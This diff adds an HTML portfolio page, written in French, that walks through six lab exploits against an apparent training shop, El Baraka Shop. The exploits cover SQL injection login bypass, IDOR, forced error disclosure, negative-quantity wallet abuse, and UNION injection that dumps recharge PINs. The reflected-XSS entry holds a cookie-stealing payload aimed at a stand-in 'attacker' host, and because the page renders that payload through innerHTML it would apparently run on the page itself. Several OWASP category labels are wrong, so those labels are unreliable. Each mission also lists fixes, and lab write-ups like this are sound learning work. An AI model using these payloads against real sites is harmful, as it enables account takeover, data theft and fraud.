@@ -1,9 +1,598 @@
-<html>
-  <head>
-    <title>My Website</title>
-  </head>
-  <body>
-    <h1>Welcome to My Website</h1>
-    <p>This is a simple HTML page.</p>
-  </body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SOC Analyst Gallery | Cybersecurity Missions</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            color: #1e293b;
+            padding: 2rem 1.5rem;
+        }
+
+        /* main container */
+        .gallery-container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        /* header style */
+        .hero {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .hero h1 {
+            font-size: 2.4rem;
+            background: linear-gradient(135deg, #0f172a, #2d3748);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            letter-spacing: -0.02em;
+        }
+
+        .hero p {
+            color: #475569;
+            margin-top: 0.5rem;
+            font-size: 1.05rem;
+            border-bottom: 2px solid #cbd5e1;
+            display: inline-block;
+            padding-bottom: 6px;
+        }
+
+        .badge-lab {
+            background: #1e293b;
+            color: #facc15;
+            font-size: 0.75rem;
+            padding: 4px 12px;
+            border-radius: 40px;
+            display: inline-block;
+            margin-top: 1rem;
+            font-weight: 500;
+        }
+
+        /* masonry / cards grid */
+        .missions-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 1.8rem;
+            margin-top: 2rem;
+        }
+
+        /* card styling - each mission tile */
+        .mission-card {
+            background: white;
+            border-radius: 1.5rem;
+            overflow: hidden;
+            box-shadow: 0 12px 24px -12px rgba(0, 0, 0, 0.15);
+            transition: all 0.25s ease;
+            cursor: pointer;
+            border: 1px solid #e2e8f0;
+            backdrop-filter: blur(0px);
+        }
+
+        .mission-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 24px 32px -16px rgba(0, 0, 0, 0.2);
+            border-color: #cbd5e1;
+        }
+
+        /* image area with screenshot simulation */
+        .card-img {
+            background: #f8fafc;
+            height: 190px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid #eef2ff;
+            position: relative;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            font-weight: 500;
+        }
+
+        /* each mission gets a unique background illustrative pattern */
+        .img-overlay {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(10, 25, 47, 0.65);
+            backdrop-filter: blur(3px);
+            color: white;
+            font-weight: 600;
+            font-size: 1.2rem;
+            text-shadow: 0 1px 3px black;
+        }
+
+        .card-content {
+            padding: 1.2rem 1.4rem 1.5rem;
+        }
+
+        .mission-number {
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #3b82f6;
+            background: #eef2ff;
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 30px;
+            margin-bottom: 10px;
+        }
+
+        .mission-title {
+            font-size: 1.45rem;
+            font-weight: 700;
+            margin: 0.5rem 0 0.6rem;
+            line-height: 1.3;
+        }
+
+        .cve-badge {
+            font-family: monospace;
+            font-size: 0.75rem;
+            background: #f1f5f9;
+            padding: 4px 8px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 12px;
+            color: #0f172a;
+        }
+
+        .short-desc {
+            color: #334155;
+            font-size: 0.9rem;
+            line-height: 1.45;
+            margin-bottom: 1rem;
+        }
+
+        .click-info {
+            font-size: 0.7rem;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-top: 0.7rem;
+            border-top: 1px solid #eef2ff;
+            padding-top: 0.8rem;
+        }
+
+        /* MODAL (popup) */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0s, opacity 0.2s ease;
+        }
+
+        .modal-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .modal-container {
+            background: #ffffff;
+            width: 90%;
+            max-width: 1100px;
+            border-radius: 2rem;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 40px 60px -20px black;
+            animation: modalEnter 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+
+        @keyframes modalEnter {
+            from {
+                transform: scale(0.96);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .modal-split {
+            display: flex;
+            flex-direction: row;
+            flex-wrap: wrap;
+        }
+
+        .modal-left {
+            flex: 1.2;
+            background: #f1f5f9;
+            padding: 1.8rem;
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid #e2e8f0;
+        }
+
+        .modal-right {
+            flex: 1;
+            background: #ffffff;
+            padding: 1.8rem;
+            overflow-y: auto;
+            max-height: 70vh;
+        }
+
+        .modal-img-sim {
+            background: #0f172a;
+            border-radius: 24px;
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+            background-size: cover;
+            background-position: center;
+            color: white;
+            font-weight: bold;
+            text-align: center;
+            padding: 1rem;
+            font-size: 1rem;
+            background-blend-mode: overlay;
+        }
+
+        .modal-meta h3 {
+            font-size: 1.7rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .attack-detail {
+            margin-top: 1rem;
+        }
+
+        .attack-detail h4 {
+            font-size: 1.1rem;
+            margin: 1rem 0 0.3rem;
+            color: #0f172a;
+            border-left: 4px solid #f97316;
+            padding-left: 12px;
+        }
+
+        .code-block {
+            background: #1e293b;
+            color: #e2e8f0;
+            padding: 0.7rem;
+            border-radius: 12px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            margin: 0.8rem 0;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+
+        .step-list {
+            padding-left: 1.2rem;
+            margin: 0.5rem 0;
+        }
+
+        .step-list li {
+            margin: 0.5rem 0;
+            line-height: 1.4;
+        }
+
+        .close-modal {
+            background: #ef4444;
+            color: white;
+            border: none;
+            font-weight: bold;
+            padding: 8px 20px;
+            border-radius: 40px;
+            margin-top: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            width: fit-content;
+        }
+
+        .close-modal:hover {
+            background: #dc2626;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            color: #62748c;
+            font-size: 0.8rem;
+            border-top: 1px solid #cbd5e1;
+            padding-top: 1.8rem;
+        }
+
+        @media (max-width: 700px) {
+            .modal-split {
+                flex-direction: column;
+            }
+            .modal-left {
+                border-right: none;
+                border-bottom: 1px solid #e2e8f0;
+            }
+            .missions-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="gallery-container">
+    <div class="hero">
+        <h1>🕵️‍♂️ Cyber Offensive · Defensive Gallery</h1>
+        <p>Analyse & exploitation des vulnérabilités web (OWASP Top 10)</p>
+        <div class="badge-lab">📸 LAB : EL BARAKA SHOP — 6 missions accomplies</div>
+    </div>
+
+    <div class="missions-grid" id="missionsGrid"></div>
+    <footer>
+        🧪 Chaque carte représente une faille identifiée et exploitée pas à pas.<br>
+        🔍 Cliquez sur n'importe quelle mission pour voir le détail technique, la méthode d'attaque et la correction.
+    </footer>
+</div>
+
+<!-- MODAL STRUCTURE -->
+<div id="missionModal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-split">
+            <div class="modal-left">
+                <div id="modalImagePreview" class="modal-img-sim">🎯 SCREENSHOT SIMULATION</div>
+                <div class="modal-meta">
+                    <h3 id="modalTitle">Mission Title</h3>
+                    <span id="modalCwe" class="cve-badge">Axx - Vuln class</span>
+                </div>
+                <button class="close-modal" id="closeModalBtn">✖ Fermer l'analyse</button>
+            </div>
+            <div class="modal-right" id="modalDetailsRight">
+                <!-- dynamic content: step by step & what i did  -->
+                <div class="attack-detail">
+                    <h4>📌 Contexte & découverte</h4>
+                    <p>Chargement en cours...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // MISSION DATA BASED ON provided images and activite partie 2
+    // each mission contains id, title, full description, steps, images (simulated bg)
+    const missions = [
+        {
+            id: 1,
+            title: "💣 Le Braquage",
+            cwe: "A05:2021 - SQL Injection (Authentication Bypass)",
+            shortDesc: "Contournement de l'authentification via injection SQL basique. Accès admin sans mot de passe.",
+            bgStyle: "linear-gradient(125deg, #1e1a2f, #2c2f4a), url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDQwIDQwIj48cGF0aCBmaWxsPSIjZmZmZmZmMjAiIGQ9Ik0xMCAxMGwyMCAwIDAgMjAtMjAgMHoiLz48L3N2Zz4=') no-repeat center/30px",
+            content: {
+                overview: "Lors de la page de connexion d'administration / espace employé, le champ login était vulnérable à une injection SQL. En soumettant une payload classique comme `admin' OR '1'='1' --` , j’ai pu contourner la vérification du mot de passe et accéder au panneau admin sans aucune authentification valide.",
+                steps: [
+                    "🔎 Étape 1 : Identifier un formulaire de connexion (Admin / employé).",
+                    "⚡ Étape 2 : Tester une injection simple `' OR '1'='1' -- ` dans le champ username.",
+                    "✅ Étape 3 : Le serveur accepte la requête et redirige vers le dashboard (session contournée).",
+                    "🧠 Étape 4 : Vérification de la base de données : la requête se comporte comme `SELECT * FROM users WHERE user='' OR '1'='1'` , ce qui retourne le premier utilisateur."
+                ],
+                fix: "Utiliser des requêtes paramétrées (préparées), échapper les entrées utilisateur / ORM. Implémenter unrate limiting et MFA.",
+                exploitPayload: "Username: `admin' OR '1'='1' --` , Password: (n'importe quoi)"
+            }
+        },
+        {
+            id: 2,
+            title: "🕵️ L'Espionnage",
+            cwe: "A01:2021 - Broken Access Control (IDOR)",
+            shortDesc: "Accès aux commandes d'autres utilisateurs via modification d'ID dans l'URL ou paramètres.",
+            bgStyle: "linear-gradient(125deg, #1f3a3f, #0f2b30), repeating-linear-gradient(45deg, #fff1 0px, #fff1 2px, transparent 2px, transparent 8px)",
+            content: {
+                overview: "Sur la section 'Mes Commandes', j'ai remarqué que les détails des commandes étaient accessibles via un paramètre GET comme `?commande_id=49336275`. En incrémentant ou modifiant cet identifiant, j'ai pu visualiser les commandes d'autres clients (IDOR).",
+                steps: [
+                    "🔍 Étape 1 : Se connecter avec un compte utilisateur et aller dans 'Mes Commandes'.",
+                    "🎯 Étape 2 : Intercepter la requête de visualisation d'une commande : /commande.php?id=49336275",
+                    "🔄 Étape 3 : Modifier l'ID manuellement en 49336274, 49336276 etc., accéder aux commandes adjacentes.",
+                    "📦 Étape 4 : Extraire les informations des autres utilisateurs (adresses, montants)."
+                ],
+                fix: "Vérifier la propriété côté serveur : l'utilisateur courant doit être lié à l'ID de commande. Utiliser des UUID non séquentiels et contrôles d'accès.",
+                exploitPayload: "GET /mes_commandes?commande_id=49336276 → informations sensibles d'un tiers."
+            }
+        },
+        {
+            id: 3,
+            title: "💥 Le Provocateur",
+            cwe: "A10:2021 - Mishandling of Exceptional Conditions",
+            shortDesc: "Forcer le site à générer une erreur critique dévoilant des traces de stack / chemins internes.",
+            bgStyle: "radial-gradient(circle at 20% 40%, #4a1d2d, #26121c)",
+            content: {
+                overview: "En injectant des caractères spéciaux ou des paramètres inattendus (ex: champ recherche avec trop de caractères, types incorrects), le serveur a retourné une stack trace détaillée, révélant le chemin absolu, structure de fichiers et parfois des informations de base de données.",
+                steps: [
+                    "⚠️ Étape 1 : Soumettre une valeur invalide dans la barre de recherche (ex: `%` ou `'\"\\`).",
+                    "💣 Étape 2 : Ajouter des paramètres non prévus: `?page=../../config`",
+                    "📄 Étape 3 : Le site affiche une erreur PHP/ASP avec le chemin complet du serveur et requête SQL.",
+                    "🗺️ Étape 4 : Cartographier la structure et préparer des attaques plus profondes."
+                ],
+                fix: "Configurer un gestionnaire d'erreurs générique, désactiver l'affichage des erreurs en production, logger les erreurs sans les exposer à l'utilisateur.",
+                exploitPayload: "Recherche : `'` → Affichage d'erreur SQL + chemin : /var/www/html/elbaraka/includes/db.php"
+            }
+        },
+        {
+            id: 4,
+            title: "🎭 Le Piège",
+            cwe: "A05:2021 - Cross-Site Scripting (XSS Reflected)",
+            shortDesc: "Injection de script malveillant via paramètre de recherche non filtré.",
+            bgStyle: "linear-gradient(145deg, #2d2a2e, #1f1b24)",
+            content: {
+                overview: "Dans la barre de recherche 'Rechercher un produit', le paramètre 'q' réfléchit directement la valeur dans la réponse HTML sans échappement. En injectant `<script>alert('XSS')</script>`, le navigateur exécute le code arbitraire.",
+                steps: [
+                    "📝 Étape 1 : Accéder à la boutique, rechercher un produit normal (ex: thé).",
+                    "🧪 Étape 2 : Tester la payload : `<script>alert(document.cookie)</script>` dans le champ.",
+                    "🚨 Étape 3 : L'alerte apparaît, preuve de XSS réfléchi. Exploitation possible: vol de session, redirections.",
+                    "🎣 Étape 4 : Construire un lien malveillant pour piéger les admins."
+                ],
+                fix: "Encoder les sorties HTML (htmlspecialchars), utiliser Content-Security-Policy, validation stricte des entrées.",
+                exploitPayload: "Rechercher : `<img src=x onerror=fetch('https://attacker/steal?cookie='+document.cookie)>`"
+            }
+        },
+        {
+            id: 5,
+            title: "✨ L'Illusionniste",
+            cwe: "A06:2021 - Insecure Design (Business Logic)",
+            shortDesc: "Abus de la logique métier : commander une quantité négative ou excessive pour manipuler le portefeuille.",
+            bgStyle: "linear-gradient(120deg, #1f3b2c, #0e2b1a)",
+            content: {
+                overview: "Lors de l'ajout au panier, aucun contrôle sur la quantité : en passant une quantité négative (ex: -5) sur un produit, le prix total devient négatif, ce qui augmente le solde du portefeuille au lieu de le diminuer. Aussi commander des quantités énormes cause des incohérences.",
+                steps: [
+                    "🛒 Étape 1 : Ajouter un produit au panier via un formulaire avec champ quantité.",
+                    "🔄 Étape 2 : Modifier la requête POST (ou paramètre) quantité = -10, prix unitaire = 150 MRU.",
+                    "💰 Étape 3 : Le total = -1500 MRU, le portefeuille augmente au lieu de diminuer.",
+                    "🚀 Étape 4 : Répéter pour générer des millions de MRU illégalement."
+                ],
+                fix: "Valider côté serveur que la quantité > 0, vérifier que le montant final n’est pas négatif, contrôles de cohérence transactionnelle.",
+                exploitPayload: "POST /commander.php → produit_id=1 & quantite=-2 & solde → +300 MRU sur le wallet."
+            }
+        },
+        {
+            id: 6,
+            title: "🏴‍☠️ Le Pilleur",
+            cwe: "A05:2021 - SQL Injection (Union Based)",
+            shortDesc: "Extraction massive des codes de recharge via injection UNION dans la recherche.",
+            bgStyle: "linear-gradient(135deg, #2c2f36, #0f1017)",
+            content: {
+                overview: "La barre de recherche était vulnérable à une injection UNION. En exploitant une requête comme `zzz' UNION SELECT 1, name, sql, 4, 5 FROM sqlite_master--`, j'ai d'abord cartographié la base. Puis j'ai extrait tous les codes PIN des cartes de recharge depuis la table `cartes_recharge`.",
+                steps: [
+                    "🧭 Étape 1 : Tester injection basique: `' OR 1=1--` sur la recherche.",
+                    "📚 Étape 2 : Déterminer le nombre de colonnes via ORDER BY / UNION SELECT NULL.",
+                    "🗄️ Étape 3 : UNION SELECT 1, name, sql,4,5 FROM sqlite_master-- pour lister les tables (découverte de cartes_recharge).",
+                    "💳 Étape 4 : UNION SELECT 1, code_pin, montant,4,5 FROM cartes_recharge -- → récupération des codes à 12 chiffres et leurs montants.",
+                    "💎 Étape 5 : Utiliser ces codes dans la section 'Code Promo / Recharge' pour créditer le portefeuille."
+                ],
+                fix: "Utiliser requêtes paramétrées, WAF, privilèges minimaux sur la base de données (lecture seule impossible pour colonnes sensibles).",
+                exploitPayload: "Rechercher: `' UNION SELECT 1, code_pin, montant, 4, 5 FROM cartes_recharge --`"
+            }
+        }
+    ];
+
+    const gridContainer = document.getElementById('missionsGrid');
+    const modalOverlay = document.getElementById('missionModal');
+    const modalTitleElem = document.getElementById('modalTitle');
+    const modalCweElem = document.getElementById('modalCwe');
+    const modalImagePreview = document.getElementById('modalImagePreview');
+    const modalDetailsRight = document.getElementById('modalDetailsRight');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+
+    function closeModal() {
+        modalOverlay.classList.remove('active');
+        document.body.style.overflow = '';
+    }
+
+    function openModal(mission) {
+        // set left image simulation with proper style
+        modalImagePreview.style.background = mission.bgStyle || "linear-gradient(135deg, #0f172a, #1e293b)";
+        modalImagePreview.style.backgroundSize = "cover";
+        modalImagePreview.style.backgroundBlendMode = "overlay";
+        modalImagePreview.innerHTML = `📸 ${mission.title} — capture d'écran (simulée)`;
+        
+        modalTitleElem.innerText = mission.title;
+        modalCweElem.innerText = mission.cwe;
+        
+        // Build detailed right panel with step by step and "what i did"
+        const detailsHtml = `
+            <div class="attack-detail">
+                <h4>🎯 Résumé de l'attaque</h4>
+                <p>${mission.content.overview}</p>
+                
+                <h4>🛠️ Procédure pas à pas (ce que j'ai fait)</h4>
+                <ul class="step-list">
+                    ${mission.content.steps.map(step => `<li>${step}</li>`).join('')}
+                </ul>
+                
+                <h4>💣 Payload / Exploit utilisé</h4>
+                <div class="code-block">${mission.content.exploitPayload}</div>
+                
+                <h4>🔒 Correction recommandée</h4>
+                <p>${mission.content.fix}</p>
+                
+                <h4 style="margin-top: 1rem;">📌 Résultat & Impact</h4>
+                <p>
+                    ${mission.id === 1 ? "Accès total au backoffice, exfiltration de données clients." : 
+                      mission.id === 2 ? "Visualisation des commandes d'autres utilisateurs, violation de confidentialité." :
+                      mission.id === 3 ? "Divulgation du chemin de la base de données, préparation d'attaques avancées." :
+                      mission.id === 4 ? "Exécution de scripts dans le navigateur des admins, vol possible de session." :
+                      mission.id === 5 ? "Exploitation monétaire illimitée, crédit du portefeuille sans achat réel." :
+                      mission.id === 6 ? "Vol des cartes de recharge (codes PIN), recharges frauduleuses massives." : "Compromission totale."}
+                </p>
+                <p style="margin-top: 12px; background:#fef9e3; padding:8px; border-radius:12px;"><strong>✅ Mission accomplie :</strong> Vulnérabilité identifiée, exploitée avec succès sur l'instance El Baraka Shop, rapport détaillé pour correction.</p>
+            </div>
+        `;
+        
+        modalDetailsRight.innerHTML = detailsHtml;
+        modalOverlay.classList.add('active');
+        document.body.style.overflow = 'hidden';
+    }
+
+    // render cards
+    function renderCards() {
+        missions.forEach(mission => {
+            const card = document.createElement('div');
+            card.className = 'mission-card';
+            card.setAttribute('data-id', mission.id);
+            
+            // simulate image area with different background
+            const imgDiv = document.createElement('div');
+            imgDiv.className = 'card-img';
+            imgDiv.style.background = mission.bgStyle;
+            imgDiv.style.backgroundSize = "cover";
+            imgDiv.style.backgroundPosition = "center";
+            // overlay text
+            const overlaySpan = document.createElement('div');
+            overlaySpan.className = 'img-overlay';
+            overlaySpan.innerText = `🔍 MISSION ${mission.id}`;
+            imgDiv.appendChild(overlaySpan);
+            
+            const contentDiv = document.createElement('div');
+            contentDiv.className = 'card-content';
+            contentDiv.innerHTML = `
+                <div class="mission-number">OWASP ${mission.cwe.split(' - ')[0]}</div>
+                <div class="mission-title">${mission.title}</div>
+                <div class="cve-badge">${mission.cwe}</div>
+                <div class="short-desc">${mission.shortDesc}</div>
+                <div class="click-info">👆 Cliquez pour voir l'exploitation détaillée &rarr;</div>
+            `;
+            
+            card.appendChild(imgDiv);
+            card.appendChild(contentDiv);
+            
+            card.addEventListener('click', () => openModal(mission));
+            gridContainer.appendChild(card);
+        });
+    }
+    
+    renderCards();
+    
+    // close modal events
+    closeModalBtn.addEventListener('click', closeModal);
+    modalOverlay.addEventListener('click', (e) => {
+        if (e.target === modalOverlay) closeModal();
+    });
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape' && modalOverlay.classList.contains('active')) closeModal();
+    });
+</script>
+</body>
 </html>
